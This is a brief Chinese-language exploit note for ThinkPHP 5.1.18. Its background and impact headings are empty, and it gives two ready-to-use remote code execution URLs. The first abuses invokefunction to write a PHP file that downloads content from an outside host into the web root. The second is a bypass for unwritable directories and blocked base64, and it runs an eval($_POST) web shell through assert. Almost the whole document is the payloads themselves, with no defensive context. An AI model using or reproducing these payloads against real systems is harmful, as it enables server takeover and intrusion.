Thinkphp 5.1.18
===============

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

### 1、常规poc

    http://www.xxxxx.com/?s=admin/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][0]=index11.php&vars[1][1]=<?=file_put_contents('index_bak2.php',file_get_contents('https://www.hack.com/xxx.js'));?>

### 2、所有目录都无写入权限,base64函数被拦截

     http://www.xxxx.com/?s=admin/\think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][0]=eval($_POST[1]
